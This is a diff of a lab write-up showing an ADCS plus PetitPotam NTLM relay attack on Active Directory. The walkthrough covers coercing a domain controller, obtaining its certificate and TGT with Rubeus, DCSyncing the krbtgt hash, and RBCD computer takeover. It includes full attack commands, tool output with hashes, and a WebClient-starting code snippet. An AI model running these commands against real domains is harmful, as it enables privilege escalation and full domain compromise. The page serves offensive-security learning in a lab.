@@ -1,8 +1,8 @@
 # ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate
 
-This is a quick lab to familiarize with an Active Directory Certificate Services \(ADCS\) + PetitPotam + NLTM Relay technique that allows attackers, given ADCS is misconfigured \(which it is by default\), to effectively escalate privileges from a low privileged domain user to Domain Admin.
+This is a quick lab to familiarize with an Active Directory Certificate Services (ADCS) + PetitPotam + NLTM Relay technique that allows attackers, given ADCS is misconfigured (which it is by default), to effectively escalate privileges from a low privileged domain user to Domain Admin.
 
-The ADCS vulnerabilities were researched by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) in [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [PetitPotam](https://github.com/topotam/PetitPotam) was researched by [Gilles Lionel @topotam77](https://twitter.com/topotam77), [ADCS attack](https://github.com/ExAndroidDev/impacket.git) implemented in impacket by [ExAndroidDev](https://twitter.com/exandroiddev).
+The ADCS vulnerabilities were researched by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin\_) in [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [PetitPotam](https://github.com/topotam/PetitPotam) was researched by [Gilles Lionel @topotam77](https://twitter.com/topotam77), [ADCS attack](https://github.com/ExAndroidDev/impacket.git) implemented in impacket by [ExAndroidDev](https://twitter.com/exandroiddev).
 
 ## Conditions
 
@@ -20,7 +20,7 @@ Below provides a high level overview of how the attack works:
 
 1. Get a foothold in an AD network with a misconfigured ADCS instance;
 2. Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS;
-3. Force the target DC to authenticate \(using PetitPotam or PrintSpooler trick\) to the box running your NTLM relay;
+3. Force the target DC to authenticate (using PetitPotam or PrintSpooler trick) to the box running your NTLM relay;
 4. Target DC attempts to authenticate to your NTLM relay;
 5. NTLM relay receives the DC$ machine account authentication and relays it to the ADCS;
 6. ADCS provides a certificate for the target DC$ computer account;
@@ -36,53 +36,53 @@ This part of the lab is setup with the following computers and servers:
 
 * 10.0.0.5 - Kali box with NTLM relay;
 * 10.0.0.6 - target Domain Controller `DC01`. This is the target DC that we will coerce to authenticate to our NTLM relay on 10.0.0.5;
-* 10.0.0.10 - Certificate Authority \(`CA01`\). This is where our NTLM relay 10.0.0.5 will forward `DC01` authentication;
-* 10.0.0.7 - Windows worksation \(`WS01`\). This is the initial foothold in the network and this is the machine that will force the `DC01` to authenticate to our NTLM relay on 10.0.0.5;
+* 10.0.0.10 - Certificate Authority (`CA01`). This is where our NTLM relay 10.0.0.5 will forward `DC01` authentication;
+* 10.0.0.7 - Windows worksation (`WS01`). This is the initial foothold in the network and this is the machine that will force the `DC01` to authenticate to our NTLM relay on 10.0.0.5;
 
 ### Installing Tools
 
 Let's pull the version of impacket that has ADCS attack implemented and checkout the right branch:
 
-```text
+```
 git clone https://github.com/ExAndroidDev/impacket.git
 cd impacket
 git checkout ntlmrelayx-adcs-attack
 ```
 
-![Installing impacket and switching to the adcs attack branch](../../.gitbook/assets/image%20%281027%29.png)
+![Installing impacket and switching to the adcs attack branch](<../../.gitbook/assets/image (1024).png>)
 
 ### Configuring Virtual Environment
 
 Prepare a python virtual environment for impacket. Start by installing the virtual environment package:
 
-```text
+```
 apt install python3-venv
 ```
 
-![Installing python3 virtual environment](../../.gitbook/assets/image%20%281031%29.png)
+![Installing python3 virtual environment](<../../.gitbook/assets/image (1027).png>)
 
 Create and activate a new virtual python environment called `impacket`:
 
-```text
+```
 python3 -m venv impacket
 source impacket/bin/activate
 ```
 
-![Initiating and activating the impacket virtual environment](../../.gitbook/assets/image%20%281036%29.png)
+![Initiating and activating the impacket virtual environment](<../../.gitbook/assets/image (1028).png>)
 
 Let's install all impacket dependencies:
 
-```text
+```
 pip install .
 ```
 
-![Installing impacket dependencies](../../.gitbook/assets/image%20%281030%29.png)
+![Installing impacket dependencies](<../../.gitbook/assets/image (1029).png>)
 
 ### Finding Certificate Authority
 
 On `WS01`, we can use a Windows LOLBIN `certutil.exe`, to find ADCS servers in the domain:
 
-![CA01 is a Certificate Authority](../../.gitbook/assets/image%20%281033%29.png)
+![CA01 is a Certificate Authority](<../../.gitbook/assets/image (1031).png>)
 
 We confirm that in our domain, `CA01` is our Certificate Authority that we will be relaying `DC01$` authentication to.
 
@@ -90,21 +90,21 @@ We confirm that in our domain, `CA01` is our Certificate Authority that we will 
 
 On Kali box at 10.0.0.5, let's setup our NTLM relay to forward incoming authentications from `DC01$` to the `CA01`, or more specifically to one of its HTTP endpoints for certificate enrollment `http://ca01/certsrv/certfnsh.asp` like so:
 
-```text
+```
 examples/ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs
 ```
 
-![NTLM relay is ready and waiting for incoming authentications](../../.gitbook/assets/image%20%281032%29.png)
+![NTLM relay is ready and waiting for incoming authentications](<../../.gitbook/assets/image (1032).png>)
 
 ### Forcing DC01 to Authenticate to NTLM Relay
 
 From `WS01`, let's force the `DC01` to authenticate to our NTLM relay at 10.0.0.5 by executing [`PetitPotam`](https://github.com/topotam/PetitPotam):
 
-```text
+```
 .\PetitPotam.exe 10.0.0.5 dc01
 ```
 
-![DC01 is coerced to authenticate to 10.0.0.5. DC01$ certificate is retrieved from CA01](../../.gitbook/assets/image%20%281029%29.png)
+![DC01 is coerced to authenticate to 10.0.0.5. DC01$ certificate is retrieved from CA01](<../../.gitbook/assets/image (1033).png>)
 
 Above shows how:
 
@@ -116,7 +116,7 @@ Above shows how:
 
 On `WS01`, we can now use `rubeus` to request a Kerberos TGT for the `DC01$` computer account like so:
 
-```text
+```
 .\Rubeus.exe asktgt /outfile:kirbi /user:dc01$ /ptt /certificate:MIIRdQIBAzCCET8GCSqGSIb3DQEHAaCCETAEghEsMIIRKDCCB18GCSqGSIb3DQEHBqCCB1AwggdMAgEAMIIHRQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIc9l++dKOgIwCAggAgIIHGBjnoQGklUyLBvwQalnv/Y5FRT5A9ZNaUC7EDMIYWfnEDsoWY+1fajEgQPjsKRX4bQYlaZpOzsK0g2zDI2H/qzBz9RJ38iRQvpBDYk77N8vWbS5AaA2ZDGuEh8v6c6v4vCvYZ98N7ZajNugyeJk+oE5R5Esdum2v/a+uv5Gk0EghNpIWUxoeRFzj7AI5URylYbnl92N97lvbXZbjJNwyBB/ifyP+J0cWXUrBQw2vIHOmjPQv1BALLj2W2j4fx5Y+Sl+wPGwlzD3uKldzR/Snd19+DZO1pqnXcP+zJLFFVLKwEc+0Xz7FP/27waugCksN7xqmBaghWhl32mYRcInZZ6I2F4uFXKWolWPsXBPVMCq3rRqW1ya+QW1WLGn/TItYN5Rybv0g3Szb/k4LmGQdSLlQwWYNXizMV2D0sb4O1BU6dHa1Joq4TBrjj/j28ECbcABU15N58VA6kvTzPcLaFBDJ8g3f4maH/q9rpsdSDV7MC9vJJ+/eByJ7DGzOzNIYst0Kykt/0+mWWErWzjgjvb8DU/ICgKB6byx3XkbBLrPDwzpMb+/WtZO15NYikilQMKnL0XkXcOP5bYdeIVKia62FrpZSgZR4lxd9JtqqpwZn78BhbUYN3WP+44Bp+j+Fo4BwDofoyhoIuEogJimMwXNFs8MXEhx66zvvYxqabJtbF63ozgSrx4mcAwME1yJMuvKGgr6DRo1CXB6ip4tqj9DN3QbxHFtdUvHXqUDxzFP5Rufxe0C8kVEV252unfFcZQgsxp52cVf2ksZnw0FVkyJSEjVC67POtc6fCoaVz43rWOps1/50gSqfSGQugjPNan59qudfaaJOf5bjrugh2bwpSozlSguU+cSeCMy77bCFRskXa/nrRlUhCeGdFfX9ilMbMnmDbuYSwE1oSiWCdWbuZ+b/7O9IPn0qhi1mLvsbgTSCaO9DybFNiEwdLBbvmPZeQg4q7cGPaklBDrAaonMOAspjUOT6fSiZnHcTLq/l/EP7vTujJW7Jiu4tStmbZzN/vhBTYU/VATgaiZaD89uOZB0do8MWKgDiyH0BQFsSOQJaS92gsbevrB/b26t/5kmbuCZVMTlRYYZhK8jgtOLCNIdii9dCmhg3kB9jaQ1BF/NzqALmVNOx2h2vhnVFLNGvxSb4zl+LYFdlF+Lrd3xD1yUP19zt2Fa7aeSlLIJZEl3qOOVFeeRQ8OIC7ho84Se4lTF9hk/3bTyonRdBwZSpCgJinCmDy7VtxPLMKbxQnsLVruE6fPLg4036F/WctuNZyooqqwYX3buJ+fGUhIO5DqNE3nPfzxQjqokiWrwJZU0ybka94UFIDCS0JUCmUdE79bjTFKH99MZt2sYqEsnnWatgpgFMbgINmdcA3m5KHyw4PZob9evTCA0g3nVdhLnMJyGAvK7ynI8NDi9QiJ1WsNe3uwttXNgkVFR8srHFvzxry93IIMJnLbuRQUBGmV/xhpj2K66NX3YHPYhU/qncYjoRZCpF9lgpbu0amqcz2vjxZtoUl1o8tcC4DreBN9I7Q9UkOrwtydBNHdcLYuLOvKecR2CpxDI5d+sRbDqAR44CO4imoaobW/c8TNrEVRoXSINMwCS0EUifNVGbSI5EgH3yNF8xK1dHYivo4Gmnhga3GbSTb6MLDYbDnMDEhgBRQ1MWBt1O7EzsURHCZKWGwK5iajxjLH8I24swzTriQjv1iglvbirFSNFQBmVpP/UvWXy5H1fQoi+JS+tnDg+U/pwY/gQNzo4E0wFxlL4QpVAAxOpYGxLoAO4QmJUL9d4NstjjpJvVFcL6vfQ0VibcWZYRRqqrfQ4qKiZ6H00VuIBL8CRFXI/bxAfJ7rZvAT/lUwqyxeRlrGs4BcM+yMbjYzd+tah8+Z6SvA9ttHFHhIF3EBjvdbLXmcZ5LKgaUqlBRvBrN2Tjs5mR7NQMRBXB7wfZv5/PlInGv0EEbh7ZI1raVR4X7j++VqHEui3Sjl7XXVNrHksHippcPtDXI/bH/Y1NxmFUskN+xlD8aKxdmmcYYmZc8/xfKypCPKCuHNyTS+MOkvYwcl0VMsH1fJCpjZ+98NykKua3Awipk8MqONEKdHrIyH3WioVzYvHpdJiqMapcRfARuATz49hJKBExhwHs7rgdF1e/fc7lSFxB8AZYFLAYEA3jccUDeyNWE/Rf2YDhLmRqYhoyc8U2UqYmRjLbSyWik1/Es0fKH0/6TBJpWkw/1EU3KJBFkTWBG9pyXdzQzVJVfLrpNBGmAvlOccP5P3QXggp6urOw3XPLc7WC/N4kwTJBZbJ6Hc5W8HRGQl25imwe+HOqfWQRcWRFezLLsxfC3d6SRtXYwSaSmGkprtXmstzLkj3uSYZQKGngSf+822NwLJsHBNXe2mK96cox7QBPjiDUBJDyzd7qBNcPFsWcXTQwggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQIsWZd5ajwoMsCAggABIIJSNXo026eAeLgiKx3N/EDau0Yb3uCBntuO2ptNuwi5yqr+CTAzv0BFhlGgbQB4gj+hiZzYvkA0G7XBCWQvv3KsN71XBw53i9koRjBhofr0J8UyUEU/4mtrCDXUcEiiiUtJ1NVViaAiSrnB2UUlBAx+YRwtXoVJLuDLnEV+98g+YUwuFayakeDac9S2Ra07bE3zXvFAUCENGKJB4lp1JOx9RMkokAuQG9s2U5tVG1F0MDTrVXHDRCBsOwQObZ4XtJFbiD+JlOM532Xv4G6hS0I0/ALv+L7ia0gTwyUWphvq7IfCgSb731OqZHlXrl3jeWgqpjs/hrg1xSHExvl17rd/NRHEdnTIF+GoKmRReuhV1lxusXLiEnMSdoSucJrjG88C6/faoGEHgndM/Su+x65g6Ak8Qai+KQVzs8GTBTtE84hLo0qz94Fxpwha7UgKfevZKP3862V0HKC0jUIwB++PIUfek04aYfe3BRcaR/9+UiPDZdWm9Q0BYK2dFHNKREadWhnOaVtdcy+izFahcFlrzQISOshrW3OKqphYhueUtuPBJqJgf41OMM01O6oLHRprFZKalyE3jMA/UMYkuU/ervHU/bbuCWCFgk3rLQujQ77bJrU6cmASa/hyGxPLYpoIBiH+72iw5vMcNgVLn8HQILdZlNwJlbegBMbgr1e/PhtuOPAyLybbw6s376W8dmrKANTJE6Ri9MI3Fug5CyMTK8J8AqryztSfWPla3IF3ImhQXJXGZb9mBJ5EPQOMCay63I3MRInHTMJg9Uz/7CUY0shrbptHb3rmggJoeQMObIPT8VyIwPOIh0YpTRGfErksZG0euna8X6Rp22lUBTFFbLXCulJOr0k/oauHCM2d3Je2FOpztL+Curncgj6vWA0+OoM75ad01p1GkF7VSbTXEqF9l4LCgX0yUhLgw+DSOYMFuLxZhpaIFzzqH1+t7IXTIVva6aHjEiLpKUa1jRYUm3Ws8m8sW0uAvjpzhSFPGtaB51qZqPFT25KryDat+bOAJ9a9Vnur269s+5+II6oirER41uCbLqQHbBT/2jjjIn4ANaxrjlSEh5cHibY8JtMKFVGzjjX0GhrdNbKucApY97GaY6AkIRZ96VjlxXfndci/4sw8ULQqYY9iyx8VxWvQQgVGYGBCRFjMO1R90LLtXLlS1xUVSENXlHH3qR+/SBk0PQw1zOdrLcFRNB1qILkVSfIE3h0upkbbGF4cTn+SheO1RJWvhDaAhWOz/xuY5qey/5LWswJVczgsPQXerExNiRvHDGVBjvEIJDJG6DsRjiYZ0iVTNamc7GxEGXDTzlBvTa7k4rwCLmVXCH320PW317afLCus/UyX4MDOzYQO+yPO2RS7IMBZmdH5RnHvsvXelTM4bvqSraqCYxGuUzAE3DOgRDrQVlSS2PdL/FnYDBU6sVPR8ENYQx869QLQHtR+AjExv4fuLf5ea1mr++U4BFqwgKe3fD6e7xWWRdotyusZi/EjU2olHM73TbjCCxNCgdP7BWvyhnrCnmwU/jJSAMEBmrTSAR5q1diTryWjXdBOibdpA2eAEp1pUHvWjxk0zRW40M+Z/FzyK7bNwZHWlghtJf2pGc77tECwybPCtIjujXJnPGfEXpQGNZE3nOpdIaSZq0aSKEhe3/o4jBlIGqcNGiHQNOVAv3YiLICZ3f2oG2oLKORaeCNN8RuBGEQpRL404eAd4H8lh2QA6ivi+wl2GXbZArtHjnqwxN7LEot7ugY9Qrvk0w/U84A/a+fvCwPfckmFDWXiCIAic6FS5D0oNlT6U4CmXXVIkgM/uTtnDLY/Eaqy52NNekhY21gTh9ZxUiz2Ad8w1jpPz0QW5duGYar/+V4U3rDI6Fgi/e6aiYlftlaUlMZq/42gHmTObyMJiBCdzBJkBrzUqAQ4s0o4vRrFGzLXV3YMA4W4wDx+iJ1VyhXUbcctQBNnXs62+iIHe2hTTBMQ2nssYtXbYiq26S6czKMmywnnNptlJeN5b7zEggbG35Q8SJXmNVgO0QwxAPvPr7MDodncrsZXlxaZqfj1LW2+VZdULOpyP7buRHLWLzLTqMvpCK2jU03hWcKuimzsC0ByeVcpnHzRCyjDjQpLXx7To1cDGGZ8gmLnvktjRmWXIRvsxys/slsbVUuwFiCn2KcBaMAtsUyDdZECFx1962WOjPVUeuhRPmdBWsFFPwsyVNwPBeq1qVOdFOS/qLOWjtlKV8oy8AvkqG+u9lvVwATbRLaKGmpzlQH43w0Bku4HCh6tjsxzWrJXZrq4PzOgsTJzf7o4RpXhI4OvOCqwZEWgcKhllIFOPlKGmFN/V1zQGhyx7rqeh36LAguqSp1F7/WNKwndCjcEcGNJKJTQM3rIbvA8MNrOKNYDzr97iRtFdYFqm9tTJNFncIrYFAkcDgyj4OCM6GhKlPam6EEB07C8lefJ40WfzGSJY6BwdvOHLmiu0Z4jPqPtlfw2tAq6OHRyQJVhPwnmxIEE2SYFmik7f6lDsrsZPIsBdvlYTNBzI8DsS+bA0uTedByVZrSsnXzrM/DatMGlEvzT8yEyq3KEEEXjTDD5XhCFgSB4y/Nf94Eqq+GclfWfhpQk1p3JmR8/r/WrRZ6/kWOjlCdhKiJ2c8W/e5I5VR+4giR+9vir6ybD+KzTE26zF29Ztp5+kfuryo0+VfkHOztDY2X24D8lStlvYVqkquARPgTd0MsOpbp1r7shfnR6JI3CcElWUDztpVnLw/QL5fh6RyEaYEqssZSXPzb/d/alv5LJmrbC2zbFzPFELdlaFduvB2F6ndDitOeXMcJvArvsKbWKwU0JE3p8zEBHsWhDvY9/hde9s5Rt+mNT1FydiIMrkB8AtRyGxneqPGn4xIWsirgfZCLtK2TMAm/rTDnTlzhBXFWGKpglMfE6tBjdZWAKYam28kyS/ZIQ0KzPn+9oVQ5WyEt0miH471awT4riA4a5UdFSH799hO/+04xJE4xHKOxK0Af1PKHixDuEiEOZ1RYpE6aLhHjNvvQvXUItv88bSUCr8ZaFOdZWxUgYDt8+ZRIPRdjplTfELIw8wjC+o1IQfpWLEuA9A993dR5JjlJlCqfeK5cRQ8cRRuwdIzkSP5XNtj3frgfHQ7uUfU2FPBDdzWrmRpqnuoZhSJL9YNjSh1yQjElMCMGCSqGSIb3DQEJFTEWBBRoEKata8znS68Bfz/djFwwy+XeTjAtMCEwCQYFKw4DAhoFAAQUW4Hj1n8xDKmLKLuu3Kp02lD5paAECBp+RjH2rBr
 ```
 
@@ -124,31 +124,35 @@ On `WS01`, we can now use `rubeus` to request a Kerberos TGT for the `DC01$` com
 Use `runas /netonly /user:fake powershell` to create a new/sacrificial logon session into which the `DC01$` TGT will be injected to prevent messing up TGTs/TGSs for your existing logon session.
 {% endhint %}
 
-![TGT for DC01$ retrieved and injected into the current logon session](../../.gitbook/assets/image%20%281025%29.png)
+![TGT for DC01$ retrieved and injected into the current logon session](<../../.gitbook/assets/image (1034).png>)
 
 `klist` confirms we now have a TGT for `DC01$` in the current logon session:
 
-![TGT for DC01$ in memory](../../.gitbook/assets/image%20%281026%29.png)
+![TGT for DC01$ in memory](<../../.gitbook/assets/image (1035).png>)
 
 We can now perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash for the user `offsense\krbtgt`:
 
-{% page-ref page="dump-password-hashes-from-domain-controller-with-dcsync.md" %}
+{% content-ref url="dump-password-hashes-from-domain-controller-with-dcsync.md" %}
+[dump-password-hashes-from-domain-controller-with-dcsync.md](dump-password-hashes-from-domain-controller-with-dcsync.md)
+{% endcontent-ref %}
 
-![DCSync pulls NTLM hash of krbtgt](../../.gitbook/assets/image%20%281035%29.png)
+![DCSync pulls NTLM hash of krbtgt](<../../.gitbook/assets/image (1036).png>)
 
 Having the NTLM hash for `krbtgt` allows us to create [Kerberos Golden Tickets](kerberos-golden-tickets.md).
 
-{% page-ref page="kerberos-golden-tickets.md" %}
+{% content-ref url="kerberos-golden-tickets.md" %}
+[kerberos-golden-tickets.md](kerberos-golden-tickets.md)
+{% endcontent-ref %}
 
 ## Remember
 
-It's worth remembering that in some AD environments there will be highly privileged accounts connecting to workstations to perform some administrative tasks and if you have local administrator rights on a compromised Windows box, you can perform ADCS + NTLM relay attack to request a certificate for that service account. 
+It's worth remembering that in some AD environments there will be highly privileged accounts connecting to workstations to perform some administrative tasks and if you have local administrator rights on a compromised Windows box, you can perform ADCS + NTLM relay attack to request a certificate for that service account.&#x20;
 
 To do so, you'd need the following:
 
 {% hint style="warning" %}
-**Reminder**  
-Consider your OPSEC.
+**Reminder**\
+****Consider your OPSEC.
 {% endhint %}
 
 * Stop the SMB service on the compromised box. This requires local admin privileges on the box and a reboot to stop the machine from listening on TCP 445;
@@ -162,20 +166,20 @@ Consider your OPSEC.
 
 It's also possible to gain administrative privileges over any remote computer given we have network access to that computer, as pointed out by Lee Christensen:
 
-{% embed url="https://twitter.com/tifkin\_/status/1418855927575302144/photo/1" %}
+{% embed url="https://twitter.com/tifkin_/status/1418855927575302144/photo/1" %}
 
 ### Lab Setup
 
 This part of the lab is setup with the following computers and servers:
 
 * 10.0.0.5 - Kali box with NTLM relay;
-* 10.0.0.7 - Windows worksation \(`WS01`\). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for a remote takeover;
+* 10.0.0.7 - Windows worksation (`WS01`). This is the box we will coerce to authenticate our Kali box, which will relay the authentication to `DC01` and setup the computer `WS01` for a remote takeover;
 * 10.0.0.6 - Domain Controller `DC01`;
-* 10.0.0.10 - Certificate Authority \(`CA01`\). This is the box from which we will coerce `WS01` to authenticate to `DC01`;
+* 10.0.0.10 - Certificate Authority (`CA01`). This is the box from which we will coerce `WS01` to authenticate to `DC01`;
 
 ### Setting up NTLM Relay
 
-Let's set up our NTLM relay on the Kali box to relay authentications to DC01 via `LDAP` and specify the `--delegate-access` flag, which will automate the [Resource Based Constrained Delegation \(RBCD\)](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md) attack steps:
+Let's set up our NTLM relay on the Kali box to relay authentications to DC01 via `LDAP` and specify the `--delegate-access` flag, which will automate the [Resource Based Constrained Delegation (RBCD)](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md) attack steps:
 
 ```python
 examples/ntlmrelayx.py -t ldaps://dc01 -smb2support --delegate-access
@@ -183,29 +187,31 @@ examples/ntlmrelayx.py -t ldaps://dc01 -smb2support --delegate-access
 
 Notes about RBCD takeover:
 
-{% page-ref page="resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md" %}
+{% content-ref url="resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md" %}
+[resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md)
+{% endcontent-ref %}
 
 ### Forcing WS01 to Authenticate to NTLM Relay
 
-On computer `CA01`, let's invoke PetitPotam and coerce `WS01` \(10.0.0.7\) to authenticate to our Kali box \(10.0.0.5\) where our NTLM relay is setup:
+On computer `CA01`, let's invoke PetitPotam and coerce `WS01` (10.0.0.7) to authenticate to our Kali box (10.0.0.5) where our NTLM relay is setup:
 
-```text
+```
 .\PetitPotam.exe kali@80/spotless.txt 10.0.0.7
 ```
 
-![](../../.gitbook/assets/image%20%281043%29.png)
+![](<../../.gitbook/assets/image (1052).png>)
 
-On our Kali box, we can see the the incoming authentication from `WS01$` was relayed to `ldaps://dc01` and that a new computer `quaiivve$` account \(that `WS01` now trusts and allows to impersonate any domain user\), was created:
+On our Kali box, we can see the the incoming authentication from `WS01$` was relayed to `ldaps://dc01` and that a new computer `quaiivve$` account (that `WS01` now trusts and allows to impersonate any domain user), was created:
 
-![LDAP relay succeeds, delegation rights setup](../../.gitbook/assets/image%20%281048%29.png)
+![LDAP relay succeeds, delegation rights setup](<../../.gitbook/assets/image (1043).png>)
 
 Below screenshot shows that the `QUAIIVEE` computer account has been indeed created and `WS01$` has some privileges to it:
 
-![Computer AD object created as part of RBCD attack](../../.gitbook/assets/image%20%281042%29.png)
+![Computer AD object created as part of RBCD attack](<../../.gitbook/assets/image (1044).png>)
 
 Additionally, we can see that the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` on computer object `WS01` contains some binary value, which is empty by default on computer objects:
 
-![WS01 has been configured for RBCD attack](../../.gitbook/assets/image%20%281064%29.png)
+![WS01 has been configured for RBCD attack](<../../.gitbook/assets/image (1065).png>)
 
 From [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md#modifying-target-computers-ad-object), we know that the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, after we've successfully performed the LDAP relay attack, effectively encodes the following: computer `WS01` trusts the computer account `QUAIIVVE$` and allows it to impersonate any domain user, including Domain Admins and grant them administrative access to `WS01`.
 
@@ -213,11 +219,11 @@ From [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](
 
 On computer `CA01`, let's calculate the RC4 hash for the newly created computer account's `QUAIIVVE$`: password:
 
-```text
+```
 .\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:'K_-Jzsb&uK!`TIH'
 ```
 
-![Rubeus calculates the RC4 hash - 3F55290748348504327CDA267FCCA190](../../.gitbook/assets/image%20%281041%29.png)
+![Rubeus calculates the RC4 hash - 3F55290748348504327CDA267FCCA190](<../../.gitbook/assets/image (1048).png>)
 
 ### Impersonating Domain Admin on WS01
 
@@ -227,9 +233,9 @@ While on `CA01`, we can use rubeus `s4u` command, which will:
 
 1. Retrieve a TGT for `offense.local\QUAIIVVE$`;
 2. Perform `S4U2Self`, which is a Kerberos extension that allows a service to obtain a TGS to **itself** on another user's behalf. So in our case, the `CA01` will request a TGS for `QUAIIVVE$@OFFENSE.LOCAL` as `administrator@offense.local`;
-3. Perform `S4U2Proxy`, which is a Kerberos extension that enables services to request TGS tickets to **other** services on behalf of a given user. In this instance, a TGS will be requested for `cifs/ws01.offense.local`, which will allow `CA01` to access `WS01` computer's file system \(i.e.,  `c$` share\) on behalf of the Domain Admin `administrator@offense.local`:
+3. Perform `S4U2Proxy`, which is a Kerberos extension that enables services to request TGS tickets to **other** services on behalf of a given user. In this instance, a TGS will be requested for `cifs/ws01.offense.local`, which will allow `CA01` to access `WS01` computer's file system (i.e.,  `c$` share) on behalf of the Domain Admin `administrator@offense.local`:
 
-```text
+```
 PS C:\tools> .\Rubeus.exe s4u /user:QUAIIVVE$ /rc4:3F55290748348504327CDA267FCCA190 /impersonateuser:administrator@offense.local /msdsspn:cifs/ws01.offense.local /ptt /domain:offense.local
 
    ______        _
@@ -344,21 +350,21 @@ PS C:\tools> .\Rubeus.exe s4u /user:QUAIIVVE$ /rc4:3F55290748348504327CDA267FCCA
 [+] Ticket successfully imported!
 ```
 
-![s4u successfully retrieves appropriate TGT and TGS](../../.gitbook/assets/image%20%281050%29.png)
+![s4u successfully retrieves appropriate TGT and TGS](<../../.gitbook/assets/image (1049).png>)
 
 We can now try to access `WS01` `c$` share from `CA01` to confirm if we've gained administrative access over `WS01`:
 
-```text
+```
 ls \\ws01.offense.local\c$
 ```
 
-![C$ share being listed on WS01 from CA01](../../.gitbook/assets/image%20%281037%29.png)
+![C$ share being listed on WS01 from CA01](<../../.gitbook/assets/image (1051).png>)
 
 ### WebClient Service
 
 For the above attack to work, the target system `WS01` has to have the `WebClient` service running:
 
-![WebClient service running on WS01](../../.gitbook/assets/image%20%281055%29.png)
+![WebClient service running on WS01](<../../.gitbook/assets/image (1053).png>)
 
 `WebClient` service is not running on computers by default and normally you'd need admin rights to start it, however it's possible to force the service to start using the below code:
 
@@ -391,15 +397,15 @@ int main()
 ```
 {% endcode %}
 
-Below shows `WebClient` service is not running on `WS01` and we cannot start it, however, executing the above code \(`webclient.cpp` compiled as `webclient.exe`\) kicks off the `WebClient` service for us:
+Below shows `WebClient` service is not running on `WS01` and we cannot start it, however, executing the above code (`webclient.cpp` compiled as `webclient.exe`) kicks off the `WebClient` service for us:
 
-![Forcing the WebClient service to run](../../.gitbook/assets/image%20%281053%29.png)
+![Forcing the WebClient service to run](<../../.gitbook/assets/image (1055).png>)
 
 ## RBCD: Local Computer TakeOver / Local Privilege Escalation
 
-It's also possible to leverage the ADCS NTLM relay + Resource Based Constrained Delegation \(RBCD\) to escalate privileges on a local computer, if regular domain users can create new machine/computer accounts in AD, which they are by default, as specified in the domain root object's attribute `ms-DS-MachineAccountQuota: 10`, as seen below:
+It's also possible to leverage the ADCS NTLM relay + Resource Based Constrained Delegation (RBCD) to escalate privileges on a local computer, if regular domain users can create new machine/computer accounts in AD, which they are by default, as specified in the domain root object's attribute `ms-DS-MachineAccountQuota: 10`, as seen below:
 
-![Regular users can add up to 10 machine accounts in the domain by default](../../.gitbook/assets/image%20%281063%29.png)
+![Regular users can add up to 10 machine accounts in the domain by default](<../../.gitbook/assets/image (1064).png>)
 
 {% hint style="info" %}
 Ability to create machine accounts applies when talking about remote computer takeover too.
@@ -415,9 +421,9 @@ This part of the lab is setup with the following computers and servers:
 
 ### Calculating Hash
 
-Building on the previous successful NTLM relay, where we forced the `WS01$` to authenticate to our Kali box \(where our NTLM relay was listening\), we got a new machine account `QUAIIVVE$` created with a password ``K_-Jzsb&uK!`TIH``. Let's re-calculate the password's hash:
+Building on the previous successful NTLM relay, where we forced the `WS01$` to authenticate to our Kali box (where our NTLM relay was listening), we got a new machine account `QUAIIVVE$` created with a password ``K_-Jzsb&uK!`TIH``. Let's re-calculate the password's hash:
 
-```text
+```
 PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:"K_-Jzsb&uK!``TIH"
 
    ______        _
@@ -442,13 +448,13 @@ PS C:\Users\spotless\Desktop> .\Rubeus.exe hash /domain:offense.local /user:QUAI
 [*]       des_cbc_md5          : A8B625105779671C
 ```
 
-![Password hash calculations](../../.gitbook/assets/image%20%281058%29.png)
+![Password hash calculations](<../../.gitbook/assets/image (1056).png>)
 
 ### Impersonating Domain Admin on WS01
 
 We can now perform the S4U against `WS01`, where we currently have low privileged access, but want to elevate to `administrator`:
 
-```text
+```
 PS C:\Users\spotless\Desktop> .\Rubeus.exe s4u /user:QUAIIVVE$ /aes256:E73CA03A03704931A928806FDBA8993FDA47404A4EA1F66BA1A64EFD90AA5F69 /impersonateuser:Administrator /msdsspn:host/ws01.offense.local /altservice:cifs /nowrap /ptt
 
    ______        _
@@ -496,43 +502,43 @@ PS C:\Users\spotless\Desktop> .\Rubeus.exe s4u /user:QUAIIVVE$ /aes256:E73CA03A0
 
 Above and below shows how a TGS for `administrator@offense.local` is granted access to `cifs/ws01.offense.local`:
 
-![TGS for administrator@offense.local issued to access cifs/ws01.offense.local](../../.gitbook/assets/image%20%281061%29.png)
+![TGS for administrator@offense.local issued to access cifs/ws01.offense.local](<../../.gitbook/assets/image (1057).png>)
 
 ### Decoding TGS to .kirbi
 
 On a Kali box, let's base64 decode the TGS we got for `administrator@offense.local` to `cifs/ws01.offense.local` and save it as `admin.kirbi`:
 
-```text
+```
